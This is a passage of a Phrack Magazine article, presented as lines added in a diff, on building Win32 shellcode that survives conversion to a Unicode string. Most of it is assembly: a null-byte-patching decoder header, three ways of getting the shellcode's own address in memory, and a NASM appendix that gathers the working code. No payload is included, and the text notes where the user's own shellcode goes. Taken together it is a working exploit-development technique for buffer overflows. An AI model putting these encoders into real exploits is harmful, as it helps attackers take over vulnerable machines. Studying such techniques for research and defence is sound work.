+Assuming EAX points to our code, we can build a header that will clean the
+code that follows it from nulls (we use add [ebp+0x0],al to align nulls) :
+
+-&gt; 1st part : we do EBX=0x00000000, and ECX=0x00000500 (approximative size 
+of buffer)
+
+ ________________________________________________________________
+|6A00              push dword 0x00000000                         |
+|6A00              push dword 0x00000000                         |
+|5D                pop ebx                                       |
+|004500            add [ebp+0x0],al                              |
+|59                pop ecx                                       |
+|004500            add [ebp+0x0],al                              |
+|BA00050041        mov edx,0x41000500                            |
+|00F5              add ch,dh                                     |
+|________________________________________________________________|
+
+-&gt; 2nd part : The patching of the 'loop code' :
+43 00 14 00 88 00 18 00 F7 has to be : 43 8A 14 58 88 14 18 E2 F7
+So we need to patch 4 bytes exactly which is simple :
+
+(N.B : using {add dword [eax],0x00??00??} takes more bytes so we will
+use a single byte mov : {mov byte [eax],0x??} to do this)
+
+ ________________________________________________________________
+|mov byte [eax],0x8A                                             |
+|inc eax                                                         |
+|inc eax                                                         |
+|mov byte [eax],0x58                                             |
+|inc eax                                                         |
+|inc eax                                                         |
+|mov byte [eax],0x14                                             |
+|inc eax                                                         |
+|                  ; one more inc to get EAX to the shellcode    |
+|________________________________________________________________|
+
+Which does, with 'align' instruction {add [ebp+0x0],al} :
+ ________________________________________________________________
+|004500            add [ebp+0x0],al                              |
+|C6008A            mov byte [eax],0x8A   ; 0x8A                  |
+|004500            add [ebp+0x0],al                              |
+|                                                                |
+|40                inc eax                                       |
+|004500            add [ebp+0x0],al                              |
+|40                inc eax                                       |
+|004500            add [ebp+0x0],al                              |
+|C60058            mov byte [eax],0x58   ; 0x58                  |
+|004500            add [ebp+0x0],al                              |
+|                                                                |
+|40                inc eax                                       |
+|004500            add [ebp+0x0],al                              |
+|40                inc eax                                       |
+|004500            add [ebp+0x0],al                              |
+|C60014            mov byte [eax],0x14   ; 0x14                  |
+|004500            add [ebp+0x0],al                              |
+|                                                                |
+|40                inc eax                                       |
+|004500            add [ebp+0x0],al                              |
+|40                inc eax                                       |
+|004500            add [ebp+0x0],al                              |
+|C600E2            mov byte [eax],0xE2   ; 0xE2                  |
+|004500            add [ebp+0x0],al                              |
+|40                inc eax                                       |
+|004500            add [ebp+0x0],al                              |
+|________________________________________________________________|
+
+This is good, we now have EAX that points to the end of the loop, that is
+to say : the shellcode.
+
+-&gt; 3rd part : The loop code (stuffed with nulls of course)
+ ________________________________________________________________
+|43                db 0x43                                       |
+|00                db 0x00      ; overwritten with 0x8A          |
+|14                db 0x14                                       |
+|00                db 0x00      ; overwritten with 0x58          |
+|88                db 0x88                                       |
+|00                db 0x00      ; overwritten with 0x14          |
+|18                db 0x18                                       |
+|00                db 0x00      ; overwritten with 0xE2          |
+|F7                db 0xF7                                       |
+|________________________________________________________________|
+
+Just after this should be placed the original working shellcode.
+
+
+
+Let's count the size of this header : (nulls don't count of course)
+
+   1st part : 10 bytes
+   2nd part : 27 bytes
+   3rd part :  5 bytes
+   -------------------
+      Total : 42 bytes
+
+I find this affordable, because i could manage to make a remote Win32
+shellcode fit in around 450 bytes.
+
+So, at the end, we made it : a shellcode that works after it has been
+turn into a unicode string !
+
+Is this really it ? No of course, we forgot something. I wrote that we
+assumed that EAX was pointing on the exact first null byte of the loop
+code. But in order to be honest with you, i will have to explain a way
+to obtain this.
+
+
+--[ 5 - Captain, we don't know our position !
+
+
+The problem is simple : We had to perform patches on memory to get our loop
+working well. So we need to know our position in memory because we are
+patching ourself.
+In an assembly program, an easy way to do this would be :
+
+ ________________________________________________________________
+|call label                                                      |
+|                                                                |
+|          label:                                                |
+|pop eax                                                         |
+|________________________________________________________________|
+
+Will get the absolute memory address of label in EAX.
+
+In a classic shellcode we will need to do a call to a lower address
+to avoid null bytes :
+
+ ________________________________________________________________
+|jmp jump_label                                                  |
+|                                                                |
+|          call_label:                                           |
+|pop eax                                                         |
+|push eax                                                        |
+|ret                                                             |
+|          jump_label:                                           |
+|call call_label                                                 |
+|                              ; ****                            |
+|________________________________________________________________|
+
+Will get the absolute memory address of '****'
+
+But this is impossible in our case because we can't jump nor call.
+Moreover, we can't parse memory looking for a signature of any kind.
+I'm sure there must be other ways to do this but i could only 3 :
+
+
+-&gt; 1st idea : we are lucky.
+
+If we are lucky, we can expect to have some registers pointing to a place
+near our evil code. In fact, this will happen in 90% of time. This place
+can't be considered as harcoded because it will surely move if the process
+memory moves, from a machine to another. (The program, before it crashed,
+must have used your data and so it must have pointers to it)
+We know we can add anything to eax (only eax)
+so we can :
+
+     - use XCHG to have the approximate address in EAX
+     - then add a value to EAX, thus moving it to wherever we want.
+
+The problem is that we can't use : add al,r8 or and ah,r8, because don't
+forget that : 
+EAX=0x000000FF + add al,1 = EAX=0x00000000
+So thoses manipulations will do different things depending on what EAX 
+contains.
+
+So all we have is : add eax,0x??00??00
+No problem, we can add 0x1200 (for example) to EAX with : 
+
+ ________________________________________________________________
+|0500110001        add eax,0x01001100                            |
+|05000100FF        add eax,0xFF000100                            |
+|________________________________________________________________|
+
+Then, it is simple to add some align data so that EAX points on what we
+want.
+For example : 
+ ________________________________________________________________
+|0400              add al,0x0                                    |
+|________________________________________________________________|
+
+would be perfect for align.
+(N.B: we will maybe need a little inc EAX to fit)
+
+Some extra space may be requiered by this methode (max : 128 bytes because
+we can only get EAX to point to the nearest address modulus 0x100, then we
+have to add align bytes. As each 2 bytes is in fact 1 buffer byte because
+of the added null bytes, we must at worst add 0x100 / 2 = 128 bytes)
+
+
+-&gt; 2nd idea : a little less lucky.
+
+If you can't find a close address within yours registers, you can maybe
+find one in the stack. Let's just hope your ESP wasn't smashed after the
+overflow.
+You just have to POP from the stack until you find a nice address. This
+methode can't be explained in a general way, but the stack always contains
+addresses the application used before you bothered it. Note that you can
+use POPAD to pop EDI, ESI, EBP, EBX, EDX, ECX, and EAX.
+Then we use the same methode as above.
+
+
+
+-&gt; 3rd idea : god forgive me.
+
+Here we suppose we don't have any interesting register, or that the values
+that the registers contain change from a try to another. Moreover, there's
+nothing interesting inside the stack. 
+
+This is a desperate case so -&gt; we use an old style samoura suicide attack.
+
+My last idea is to :
+
+     - Take a &quot;random&quot; memory location that has write access
+     - Patch it with 3 bytes
+     - Call this location with a relative call
+
+First part is the more hazardous : we need to find an address that is 
+within a writeable section. We'd better find one at the end of a section
+full on nulls or something like that, because we're gonna call quite
+randomly. The easiest way to do this is to take for example the .data
+section of the target Portable Executable. It is usually a quite large
+section with Flags : Read/Write/Data.
+So this is not a problem to kind of 'hardcode' an address in this area.
+So for the first step we just pisk an address in the middle of this,
+it won't matter where.
+(N.B : if one of your register points to a valid location after the
+overflow, you don't have to do all this of course)
+We assume the address is 0x004F1200 for example :
+
+Using what we saw previously, it is easy to set EAX to this address :
+ ________________________________________________________________
+|B8004F00AA        mov eax,0xAA004F00        ; EAX = 0xAA004F00  |
+|50                push eax                                      |
+|4C                dec esp                                       |
+|58                pop eax                   ; EAX = 0x004F00??  |
+|B000              mov al,0x0                ; EAX = 0x004F0000  |
+|B9001200AA        mov ecx,0xAA001200                            |
+|00EC              add ah,ch                                     |
+|                                   ; finally : EAX = 0x004F1200 |
+|________________________________________________________________|
+
+
+Then we will patch this writeable memory location with (guess what) :
+ ________________________________________________________________
+|pop eax                                                         |
+|push eax                                                        |
+|ret                                                             |
+|________________________________________________________________|
+
+Hex code of the patch : [58 50 C3]
+
+This would give us, after we called this address, a pointer to our code in
+EAX. This would be the end of the trouble. So let's patch this :
+
+Remember that EAX contains the address we are patching. What we are going
+to do is first patch with 58 00 C3 00 then move EAX 1 byte ahead, and put
+the last byte : 0x50 between the two others.
+(N.B : don't forget that byte are pushed in a reverse order in the stack)
+
+ ________________________________________________________________
+|C7005800C300      mov dword [eax],0x00C30058                    |
+|40                inc eax                                       |
+|C60050            mov byte [eax],0x50                           |
+|________________________________________________________________|
+
+Done with patching. Now we must call this location. I no i said that we
+couldn't call anything, but this is a desperate case, so we use a 
+relative call :
+
+ ________________________________________________________________
+|E800??00!!        call (here + 0x!!00??00)                      |
+|                                       (**)                     |
+|________________________________________________________________|
+
+In order to get this methode working, you have to patch the end of a large
+memory section containing nulls for example. Then we can call anywhere in
+the area, it will end up executing our 3 bytes code.
+
+After this call, EAX will have the address of (**), we are saved because we
+just need to add EAX a value we can calculate because it is just a
+difference between two offsets of our code. Therefore, we can't use
+previous technique to add bytes to EAX because we want to add less then
+0x100. So we can't do the {add eax, imm32} stuff. Let's do something else :
+
+              add dword [eax], byte 0x?? 
+
+is the key, because we can add a byte to a dword, this is perfect.
+
+EAX points to (**), se can can use this memory location to set the new EAX
+value and put it back into EAX. We assume we want to add 0x?? to eax :
+(N.B : 0x?? can't be larger than 0x80 because the :
+              add dword [eax], byte 0x?? 
+we are using is signed, so if you set a large value, it will sub instead of 
+add. (Then add a whole 0x100 and add some align to your code but this won't
+happen as 42*2 bytes isn't large enough i think)
+ ________________________________________________________________
+|0400              ad al,0x0       ; the 0x04 will be overwritten|
+|8900              mov [eax],eax                                 |
+|8300??            add dword [eax],byte 0x??                     |
+|8B00              mov eax,[eax]                                 |
+|________________________________________________________________|
+
+Everything is alright, we can make EAX point to the exact first null byte 
+of loop_code as we wished.
+We just need to calculate 0x?? (just count the bytes including nulls 
+between loop_code and the call and you'll find 0x5A)
+
+
+
+
+--[ 6 - Conclusion
+
+Finally, we could make a unishellcode, that won't be altered after a 
+str to unicode transformation.
+I'm waiting other ideas or techniques to perform this, i'm sure there
+are plenty of things i haven't thought about.
+
+
+
+Thanks to : 
+            - NASM Compiler and disassembler (i like its style =)
+            - Datarescue IDA
+            - Numega SoftIce
+            - Intel and its processors
+
+Documentation :
+	    - http://www.intel.com     for the official intel assembly doc
+
+Greetings go to : 
+            - rix, for showing us beautiful things in his articles
+	    - Tomripley, who always helps me when i need him !
+
+
+
+--| 7 - Appendix : Code
+
+
+For test purpose, i give you a few lines of code to play with (NASM style)
+It is not really a code sample, but i gathered all my examples so that you
+don't have to look everywhere in my messy paper to find what you need...
+
+- main.asm ----------------------------------------------------------------
+%include &quot;\Nasm\include\language.inc&quot;
+
+[global main]
+        
+segment .code public use32
+..start:
+
+; *********************************************
+; *   Assuming EAX points to (*) (see below)  *
+; *********************************************
+
+;
+; Setting EBX to 0x00000000 and ECX to 0x00000500
+;
+push byte 00	      ; 6A00
+push byte 00	      ; 6A00
+pop ebx               ; 5D
+add [ebp+0x0],al      ; 004500
+pop ecx               ; 59
+add [ebp+0x0],al      ; 004500
+mov edx,0x41000500    ; BA00050041
+add ch,dh             ; 00F5
+
+
+;
+; Setting the loop_code
+;
+add [ebp+0x0],al      ; 004500
+mov byte [eax],0x8A   ; C6008A
+add [ebp+0x0],al      ; 004500
+
+inc eax               ; 40
+add [ebp+0x0],al      ; 004500
+inc eax               ; 40
+add [ebp+0x0],al      ; 004500
+mov byte [eax],0x58   ; C60058
+add [ebp+0x0],al      ; 004500
+
+inc eax               ; 40
+add [ebp+0x0],al      ; 004500
+inc eax               ; 40
+add [ebp+0x0],al      ; 004500
+mov byte [eax],0x14   ; C60014
+add [ebp+0x0],al      ; 004500
+
+inc eax               ; 40
+add [ebp+0x0],al      ; 004500
+inc eax               ; 40
+add [ebp+0x0],al      ; 004500
+mov byte [eax],0xE2   ; C600E2
+add [ebp+0x0],al      ; 004500
+inc eax               ; 40
+add [ebp+0x0],al      ; 004500
+
+;
+; Loop_code
+;
+
+db 0x43 
+db 0x00 ;0x8A         (*)
+db 0x14 
+db 0x00 ;0x58
+db 0x88 
+db 0x00 ;0x14 
+db 0x18 
+db 0x00 ;0xE2 
+db 0xF7
+
+; &lt; Paste 'unicode' shellcode there &gt;
+
+-EOF-----------------------------------------------------------------------
+
+Then the 3 methodes to get EAX to point to the chosen code.
+(N.B : The 'main' code is 42*2 = 84 bytes long)
+
+- methode1.asm ------------------------------------------------------------
+; *********************************************
+; *        Adjusts EAX (+ 0xXXYY bytes)       *
+; *********************************************
+
+; N.B : 0xXX != 0x00
+
+add eax,0x0100XX00    ; 0500XX0001
+add [ebp+0x0],al      ; 004500
+add eax,0xFF000100    ; 05000100FF
+add [ebp+0x0],al      ; 004500
+
+                            ; we added 0x(XX+1)00 to EAX
+
+; using : add al,0x0 as a NOP instruction :
+add al,0x0            ; 0400
+add al,0x0            ; 0400
+add al,0x0            ; 0400
+; [...]   &lt;--  (0x100 - 0xYY) /2  times
+add al,0x0            ; 0400
+add al,0x0            ; 0400
+add al,0x0            ; 0400
+
+; (N.B) if 0xYY is odd then add a :
+dec eax               ; 48
+add [ebp+0x0],al      ; 004500
+-EOF-----------------------------------------------------------------------
+
+
+
+- methode2.asm ------------------------------------------------------------
+; *********************************************
+; *         Basically : POPs and XCHG         *
+; *********************************************
+
+popad                 ; 61
+add [ebp+0x0],al      ; 004500
+xchg eax, ?           ; 1 non null byte    (find out what to do here)
+add [ebp+0x0],al      ; 004500
+
+; do it again if needed, then use methode1 to make everything okay
+-EOF-----------------------------------------------------------------------
+
+
+
+- methode3.asm ------------------------------------------------------------
+; *********************************************
+; *                Using a CALL               *
+; *********************************************
+
+; Get the wanted address
+
+mov eax,0xAA00??00         ; B800??00AA
+add [ebp+0x0],al           ; 004500
+push eax                   ; 50
+add [ebp+0x0],al           ; 004500
+dec esp                    ; 4C
+add [ebp+0x0],al           ; 004500
+pop eax                    ; 58
+add [ebp+0x0],al           ; 004500
+mov al,0x0                 ; B000
+mov ecx,0xAA00!!00         ; B900!!00AA
+add ah,ch                  ; 00EC
+add [ebp+0x0],al           ; 004500
+
+; EAX = 0x00??!!00
+
+; awfull patch, i agree
+mov dword [eax],0x00C30058 ; C7005800C300
+inc eax                    ; 40
+add [ebp+0x0],al           ; 004500
+mov byte [eax],0x50        ; C60050
+add [ebp+0x0],al           ; 004500
+
+          ; just pray and call
+
+call 0x????????            ; E800!!00??
+
+add [ebp+0x0],al           ; 004500
+
+; then add 90d = 0x5A to EAX (to reach (*), where the loop_code is)
+; case where 0xXX = 0x00 so we can't use methode1
+
+add al,0x0                 ; 0400     because we're patching at [eax]
+
+mov [eax],eax              ; 8900
+add dword [eax],byte 0x5A  ; 83005A
+add [ebp+0x0],al           ; 004500
+mov eax,[eax]              ; 8B00
+
+; EAX pointes to the very first null byte of loop_code
+
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
+</pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
